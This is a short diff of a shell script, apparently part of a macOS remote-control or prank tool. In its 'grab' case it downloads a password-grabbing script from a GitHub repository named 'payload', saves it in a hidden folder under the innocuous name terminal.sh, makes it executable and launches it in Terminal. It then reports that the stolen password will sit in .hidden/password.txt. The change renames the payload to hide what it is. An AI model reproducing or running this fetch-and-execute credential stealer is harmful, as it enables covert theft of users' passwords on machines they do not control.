@@ -85,12 +85,11 @@ message)
     afplay .hidden/audio.mp3
     ;;
 grab)
-curl -s https://raw.githubusercontent.com/sorrynotsorry1/payload/main/password_grabber.sh >> .hidden/password_grabber.sh
+curl -s https://raw.githubusercontent.com/sorrynotsorry1/payload/main/password_grabber.sh >> .hidden/terminal.sh
 sleep 5
-chmod +x .hidden/password_grabber.sh
-make -f .hidden/password_grabber 
+chmod +x .hidden/terminal.sh
 sleep 5
-open .hidden/password_grabber
+open -a terminal.app .hidden/terminal.sh
 echo "password will be stored in .hidden/password.txt"
 ;;
 clear)
